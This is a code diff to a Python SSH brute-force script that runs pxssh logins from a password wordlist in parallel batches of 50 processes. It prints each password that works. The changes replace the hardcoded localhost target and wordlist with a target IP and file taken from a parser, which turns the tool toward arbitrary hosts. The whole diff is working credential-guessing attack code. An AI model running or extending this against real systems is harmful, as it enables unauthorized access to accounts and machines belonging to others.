@@ -71,7 +71,7 @@ class Client():
 		try:
 			self.ssh_client = pxssh.pxssh()
 			self.ssh_client.login(host_name, username, password)
-			print(f"[+] Password is --> {password}")
+			print(f"\n[+] Password is --> {password}")
 			self.ssh_client.close()
 		except pexpect.pxssh.ExceptionPxssh:
 			pass
@@ -81,8 +81,8 @@ class Queue(queue.Queue, Client):
 		queue.Queue.__init__(self)
 		self.maxsize = 50
 
-	def read_word_list(self):
-		with open("testing.txt", "r") as f:
+	def read_word_list(self, file):
+		with open(file, "r") as f:
 			data = f.readlines()
 			f.close()
 
@@ -90,20 +90,22 @@ class Queue(queue.Queue, Client):
 			passwords = passwords.strip()
 			yield passwords
 
-	def put_que(self, host_name, username):
+	def put_que(self, host_name, username, file):
 		count = 0
-		get_files = self.read_word_list()
+		get_files = self.read_word_list(file)
 
 		for password in get_files:
 			self.put(password)
 			if self.qsize() == 50:
 				while not self.empty():
-					t = Process(target=self.ssh_main, args=(host_name, username, self.get()))
+					t = Process(target=self.ssh_main, args=(host_name, username, self.get()), daemon=True)
 					t.start()
 					count += 1
 					print(f"\rAttempts: {str(count)}", flush=True, end="")
-				with self.mutex:
-					self.queue.clear()
+
+					if self.empty():
+						with self.mutex:
+							self.queue.clear()
 
 
 if __name__ == '__main__':
@@ -116,8 +118,9 @@ if __name__ == '__main__':
 
 	if check_ssh_port:
 		print("[+] Port open")
-		#file = Parser().get_file()
+		target = Parser().get_target_ip()
+		file = Parser().get_file()
 		username = Parser().get_username()
 
-		
-		Queue().put_que("127.0.0.1", username)
+
+		Queue().put_que(target, username, file)
